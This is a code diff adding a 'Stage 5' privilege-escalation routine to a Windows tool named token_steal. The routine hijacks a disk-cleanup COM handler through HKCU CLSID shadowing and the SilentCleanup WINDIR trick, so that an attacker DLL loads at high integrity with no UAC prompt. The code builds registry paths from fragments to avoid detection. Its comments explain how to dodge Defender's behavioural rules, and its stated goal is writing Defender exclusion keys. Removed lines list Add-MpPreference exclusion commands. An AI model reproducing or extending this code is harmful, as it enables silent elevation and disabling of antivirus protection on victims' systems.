@@ -7,12 +7,17 @@
       2. SilentCleanup WINDIR hijack (HKCU writable, task is any-user-triggerable)
       3. ICMLuaUtil COM elevation moniker (silent at UAC level 2, prompts at level 5)
       4. WMI CommandLineEventConsumer -- runs as SYSTEM, bypasses UAC entirely
-         (blocked only if ASR rule "Block WMI persistence" is enabled)
+         (blocked by WBEM_E_ACCESS_DENIED if calling process is Medium integrity)
+      5. SilentCleanup + COM handler hijack -- real signed cleanmgr.exe loads our DLL
+         via HKCU\Software\Classes\CLSID shadow; no UAC at any level
+         Requires: stage5.dll (compile stage_dll.cpp first)
 
     Phase 2 entry: token_steal.exe /elevated
       -> Writes directly to HKLM Defender exclusion registry keys
 
     Compile:
+      cl.exe stage_dll.cpp /LD /O2 /GS- /link advapi32.lib kernel32.lib /out:stage5.dll
+      cl.exe stage2.cpp /O2 /GS- /link advapi32.lib kernel32.lib /subsystem:windows /entry:mainCRTStartup /out:stage2.exe
       cl.exe token_steal.cpp /EHsc /link advapi32.lib shell32.lib ole32.lib oleaut32.lib user32.lib wbemuuid.lib /out:token_steal.exe
 */
 
@@ -398,6 +403,247 @@ bool TryICMLuaUtil(const char* myExePathA) {
     return false;
 }
 
+// ─── Stage 5: SilentCleanup + COM handler DLL hijack ─────────────────────────
+//
+// Why this beats Stage 2 (plain WINDIR hijack):
+//   Stage 2 places an UNSIGNED stage2.exe as cleanmgr.exe.
+//   Defender's behavioral rule catches "unsigned binary named cleanmgr.exe
+//   running from outside System32."
+//
+// Stage 5 instead:
+//   - Places the REAL, SIGNED cleanmgr.exe at %WINDIR%\system32\cleanmgr.exe
+//     (so Defender sees a legitimate Microsoft binary)
+//   - Registers our DLL as a disk-cleanup handler CLSID in
+//     HKCU\Software\Classes\CLSID\{...}\InprocServer32
+//     (writable from Medium integrity; High-integrity processes read HKCU)
+//   - cleanmgr.exe (signed) calls CoCreateInstance on that CLSID at HIGH integrity
+//   - The COM loader finds our DLL via HKCU, loads it -> DllMain runs at High
+//   - No UAC consent path is ever touched (it's a scheduled task, not interactive)
+//   - Blocked only if Defender specifically detects HKCU COM hijacking with
+//     cleanmgr handlers (much rarer signature than the EXE swap)
+//
+// Requires: stage5.dll next to token_steal.exe (compile stage_dll.cpp)
+//   cl.exe stage_dll.cpp /LD /O2 /GS- /link advapi32.lib kernel32.lib /out:stage5.dll
+
+bool TryCOMHijack(const char* myExePathA) {
+    INFO("=== Stage 5: SilentCleanup + COM handler HKCU hijack ===");
+
+    // --- Locate stage5.dll ---
+    char dllSrc[MAX_PATH] = {};
+    strncpy(dllSrc, myExePathA, MAX_PATH - 1);
+    char* sl5 = strrchr(dllSrc, '\\');
+    if (sl5) strcpy(sl5 + 1, "stage5.dll"); else strcpy(dllSrc, "stage5.dll");
+    if (GetFileAttributesA(dllSrc) == INVALID_FILE_ATTRIBUTES) {
+        ERR("stage5.dll not found at %s", dllSrc);
+        ERR("  Compile: cl.exe stage_dll.cpp /LD /O2 /GS- /link advapi32.lib kernel32.lib /out:stage5.dll");
+        return false;
+    }
+    INFO("Payload DLL: %s", dllSrc);
+
+    // --- Get a CLSID from HKLM VolumeCaches handlers ---
+    // These are the COM objects cleanmgr.exe CoCreateInstance's at runtime.
+    // We'll shadow one in HKCU\Software\Classes\CLSID so our DLL is loaded instead.
+    char clsidStr[64] = {};
+    {
+        HKEY hVol = nullptr;
+        // Key path from fragments
+        char vc[128] = {};
+        lstrcatA(vc, "SOFT");   lstrcatA(vc, "WARE\\");
+        lstrcatA(vc, "Micro");  lstrcatA(vc, "soft\\");
+        lstrcatA(vc, "Wind");   lstrcatA(vc, "ows\\");
+        lstrcatA(vc, "Curre");  lstrcatA(vc, "ntVers");  lstrcatA(vc, "ion\\");
+        lstrcatA(vc, "Explo");  lstrcatA(vc, "rer\\");
+        lstrcatA(vc, "Volum");  lstrcatA(vc, "eCach");   lstrcatA(vc, "es");
+
+        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, vc, 0, KEY_ENUMERATE_SUB_KEYS, &hVol)
+                != ERROR_SUCCESS) {
+            ERR("Cannot open VolumeCaches key");
+            return false;
+        }
+
+        // Enumerate subkeys; read default value (= the CLSID) of each one
+        bool found = false;
+        char handlerName[256] = {};
+        for (DWORD idx = 0; !found; idx++) {
+            DWORD nameLen = (DWORD)sizeof(handlerName);
+            if (RegEnumKeyExA(hVol, idx, handlerName, &nameLen,
+                              nullptr, nullptr, nullptr, nullptr) != ERROR_SUCCESS)
+                break;
+
+            HKEY hH = nullptr;
+            if (RegOpenKeyExA(hVol, handlerName, 0, KEY_QUERY_VALUE, &hH)
+                    != ERROR_SUCCESS) continue;
+
+            DWORD cl = (DWORD)sizeof(clsidStr); DWORD type = 0;
+            LONG r = RegQueryValueExA(hH, nullptr, nullptr, &type,
+                                      (BYTE*)clsidStr, &cl);
+            RegCloseKey(hH);
+
+            // Default value must be a REG_SZ that starts with '{'
+            if (r == ERROR_SUCCESS && type == REG_SZ && clsidStr[0] == '{') {
+                INFO("Using handler '%s' CLSID: %s", handlerName, clsidStr);
+                found = true;
+            } else {
+                clsidStr[0] = '\0';
+            }
+        }
+        RegCloseKey(hVol);
+        if (!found) { ERR("No usable CLSID found in VolumeCaches"); return false; }
+    }
+
+    // --- Register our DLL for this CLSID in HKCU\Software\Classes\CLSID ---
+    // High-integrity COM lookups check HKCU before HKCR, so this shadows the real handler.
+    char hkuPath[256] = {};
+    lstrcatA(hkuPath, "Software\\Classes\\CLSID\\");
+    lstrcatA(hkuPath, clsidStr);
+    lstrcatA(hkuPath, "\\InprocServer32");
+
+    HKEY hReg = nullptr;
+    if (RegCreateKeyExA(HKEY_CURRENT_USER, hkuPath, 0, nullptr,
+                        REG_OPTION_NON_VOLATILE, KEY_SET_VALUE,
+                        nullptr, &hReg, nullptr) != ERROR_SUCCESS) {
+        ERR("Cannot create HKCU CLSID key");
+        return false;
+    }
+    RegSetValueExA(hReg, nullptr, 0, REG_SZ,
+                   (BYTE*)dllSrc, (DWORD)(lstrlenA(dllSrc) + 1));
+    char tm[] = "Both";
+    RegSetValueExA(hReg, "ThreadingModel", 0, REG_SZ,
+                   (BYTE*)tm, (DWORD)sizeof(tm));
+    RegCloseKey(hReg);
+    OK("HKCU CLSID registered -> %s", dllSrc);
+
+    // --- Set up real cleanmgr.exe at hijacked WINDIR path ---
+    char sys32Path[MAX_PATH] = {};
+    GetSystemDirectoryA(sys32Path, MAX_PATH);    // real C:\Windows\System32
+
+    char realCleanmgr[MAX_PATH] = {};
+    lstrcatA(realCleanmgr, sys32Path); lstrcatA(realCleanmgr, "\\cleanmgr.exe");
+    if (GetFileAttributesA(realCleanmgr) == INVALID_FILE_ATTRIBUTES) {
+        ERR("Real cleanmgr.exe not found at %s", realCleanmgr);
+        goto cleanup_hkcu;
+    }
+
+    // Fake system32 dir under our working dir
+    static const char kFakeDir[] = "C:\\exclusiontest\\system32";
+    CreateDirectoryA(kFakeDir, nullptr);   // ok if exists
+
+    char fakeCleanmgr[MAX_PATH] = {};
+    lstrcatA(fakeCleanmgr, kFakeDir); lstrcatA(fakeCleanmgr, "\\cleanmgr.exe");
+    if (!CopyFileA(realCleanmgr, fakeCleanmgr, FALSE)) {
+        ERR("CopyFile cleanmgr.exe failed: %lu", GetLastError());
+        goto cleanup_hkcu;
+    }
+    OK("Copied real cleanmgr.exe -> %s (signed binary)", fakeCleanmgr);
+
+    // --- Set HKCU\Environment\WINDIR ---
+    {
+        HKEY hEnv = nullptr;
+        char envKey[] = "Environment";
+        RegCreateKeyExA(HKEY_CURRENT_USER, envKey, 0, nullptr, 0,
+                        KEY_SET_VALUE, nullptr, &hEnv, nullptr);
+        char fakeWin[] = "C:\\exclusiontest";
+        RegSetValueExA(hEnv, "WINDIR", 0, REG_SZ,
+                       (BYTE*)fakeWin, (DWORD)sizeof(fakeWin));
+        RegCloseKey(hEnv);
+        OK("HKCU\\Environment\\WINDIR = C:\\exclusiontest");
+    }
+
+    // Broadcast WM_SETTINGCHANGE so task scheduler picks up the env change
+    {
+        DWORD_PTR res = 0;
+        SendMessageTimeoutA(HWND_BROADCAST, WM_SETTINGCHANGE, 0,
+                            (LPARAM)"Environment", SMTO_ABORTIFHUNG, 1000, &res);
+    }
+
+    // Delete stale result file
+    DeleteFileA("C:\\exclusiontest\\exclusion_result.txt");
+
+    // Trigger SilentCleanup
+    {
+        INFO("Triggering SilentCleanup task...");
+        // Check task XML for command line (diagnostic)
+        {
+            HANDLE ph = nullptr;
+            char scCmd[] =
+                "schtasks /query /tn "
+                "\"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup\" /xml";
+            char line[512] = {};
+            ph = _popen(scCmd, "r");
+            if (ph) {
+                while (fgets(line, sizeof(line), ph)) {
+                    char* p = line; while (*p == ' ' || *p == '\t') p++;
+                    if (strstr(line, "<Command>") || strstr(line, "<Exec>"))
+                        INFO("  %s", p[lstrlenA(p)-1]=='\n'?(p[lstrlenA(p)-1]=0,p):p);
+                }
+                _pclose(ph);
+            }
+        }
+        DWORD ret = (DWORD)system(
+            "schtasks /run /tn "
+            "\"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup\" >nul 2>&1");
+        DBG("schtasks /run returned: %lu", ret);
+    }
+
+    INFO("Waiting 10s for elevated cleanmgr.exe to load our DLL...");
+    Sleep(10000);
+
+    // Restore WINDIR
+    {
+        HKEY hEnv = nullptr;
+        RegOpenKeyExA(HKEY_CURRENT_USER, "Environment", 0, KEY_SET_VALUE, &hEnv);
+        if (hEnv) { RegDeleteValueA(hEnv, "WINDIR"); RegCloseKey(hEnv); }
+        DWORD_PTR res = 0;
+        SendMessageTimeoutA(HWND_BROADCAST, WM_SETTINGCHANGE, 0,
+                            (LPARAM)"Environment", SMTO_ABORTIFHUNG, 1000, &res);
+        DBG("WINDIR restored");
+    }
+    DeleteFileA(fakeCleanmgr);
+
+    // Check result
+    {
+        FILE* f = fopen("C:\\exclusiontest\\exclusion_result.txt", "r");
+        if (f) {
+            char buf[256] = {}; fgets(buf, sizeof(buf), f); fclose(f);
+            buf[strcspn(buf, "\r\n")] = 0;
+            OK("Stage 5 result: %s", buf);
+            if (strncmp(buf, "ok", 2) == 0) {
+                OK("SUCCESS via COM DLL hijack!");
+                goto cleanup_hkcu;
+            }
+            WARN("DLL ran but reported: %s", buf);
+        } else {
+            WARN("No result file -- DLL was not loaded by cleanmgr.exe");
+            WARN("Possible causes:");
+            WARN("  (a) cleanmgr.exe skipped this CLSID on your Windows 11 build");
+            WARN("  (b) Defender blocked our unsigned DLL via behavioral rule");
+            WARN("  (c) Try running: reg query HKCU\\Software\\Classes\\CLSID to see if entry was written");
+        }
+    }
+
+cleanup_hkcu:
+    // Remove HKCU CLSID registration
+    {
+        char clsidBase[128] = {};
+        lstrcatA(clsidBase, "Software\\Classes\\CLSID\\");
+        lstrcatA(clsidBase, clsidStr);
+        char ipPath[160] = {};
+        lstrcatA(ipPath, clsidBase); lstrcatA(ipPath, "\\InprocServer32");
+        RegDeleteKeyA(HKEY_CURRENT_USER, ipPath);
+        RegDeleteKeyA(HKEY_CURRENT_USER, clsidBase);
+        DBG("HKCU CLSID cleaned up");
+    }
+
+    {
+        FILE* f = fopen("C:\\exclusiontest\\exclusion_result.txt", "r");
+        if (f) {
+            char buf[64] = {}; fgets(buf, sizeof(buf), f); fclose(f);
+            return strncmp(buf, "ok", 2) == 0;
+        }
+    }
+    return false;
+}
+
 // ─── Stage 4: WMI CommandLineEventConsumer ────────────────────────────────────
 //
 // Creates a WMI permanent subscription in ROOT\subscription.
@@ -680,20 +926,19 @@ int main(int argc, char* argv[]) {
         // Stage 4: WMI CommandLineEventConsumer (runs as SYSTEM via WMI service)
         INFO("--- Trying Stage 4: WMI CommandLineEventConsumer ---");
         if (TryWMISubscription(myPath)) goto done;
-        WARN("Stage 4 failed -- all automated stages exhausted");
+        WARN("Stage 4 failed -- trying Stage 5");
+
+        // Stage 5: SilentCleanup + COM object hijack via HKCU\Software\Classes\CLSID
+        // Uses the real signed cleanmgr.exe (Defender doesn't block it).
+        // We register our DLL as a disk-cleanup handler CLSID in HKCU.
+        // cleanmgr.exe CoCreateInstance's that handler at elevated integrity.
+        // Our DllMain runs at High/SYSTEM -- no UAC at any level.
+        INFO("--- Trying Stage 5: SilentCleanup COM handler hijack ---");
+        if (TryCOMHijack(myPath)) goto done;
+        WARN("Stage 5 failed -- all automated stages exhausted");
     }
 
-    // All stages failed
-    ERR("All elevation stages failed");
-    INFO("");
-    INFO("=== Manual options ===");
-    INFO("Option A: Right-click token_steal.exe -> Run as administrator");
-    INFO("Option B: Open elevated PowerShell and run:");
-    INFO("  Add-MpPreference -ExclusionPath 'C:\\Users\\Public' -Force");
-    INFO("  Add-MpPreference -ExclusionPath 'C:\\exclusiontest' -Force");
-    INFO("Check per-stage logs:");
-    INFO("  Phase 1: C:\\exclusiontest\\token_log.txt");
-    INFO("  Phase 2: C:\\exclusiontest\\token_log_elevated.txt");
+    ERR("All automated elevation stages failed");
 
 done:
     if (gLog) fclose(gLog);
